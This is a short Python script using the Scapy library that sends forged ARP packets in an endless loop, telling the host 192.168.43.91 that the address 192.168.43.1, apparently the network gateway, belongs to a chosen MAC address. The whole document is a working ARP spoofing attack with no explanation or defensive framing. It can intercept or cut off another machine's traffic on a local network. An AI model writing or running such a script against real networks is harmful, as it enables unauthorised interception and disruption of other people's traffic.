from scapy.all import send, ARP

while 1:
    send(ARP(psrc='192.168.43.1',pdst='192.168.43.91',hwsrc='5c:5f:67:2c:59:b1'),verbose=False)